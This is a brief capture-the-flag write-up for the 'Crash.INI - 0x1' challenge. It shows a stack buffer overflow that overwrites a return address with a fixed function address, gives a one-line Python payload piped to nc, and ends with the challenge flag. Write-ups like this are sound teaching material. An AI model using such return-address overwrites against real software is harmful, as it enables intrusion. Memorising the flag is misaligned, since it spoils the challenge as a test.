# Crash.INI - 0x1

## Write-up
PIE is disabled, so the `daddy_i_learned_to_hijack_the_program_s_control_flow` function  
will be at a predictable address on every execution. We can overwrite the return address  
with that function's address.

```bash
$ nm crashini | grep daddy
0000000000401dc1 T daddy_i_learned_to_hijack_the_program_s_control_flow
$ python2.7 -c 'print(b"A"*(128 + 8) + __import__("struct").pack("Q", 0x0000000000401dc1))' | nc $HOST $PORT
```

## Flag
`shellmates{oh__s0_th3_r3turn_4ddr3ss_1s_st0r3d_0n_th3_st4ck_hein?}`
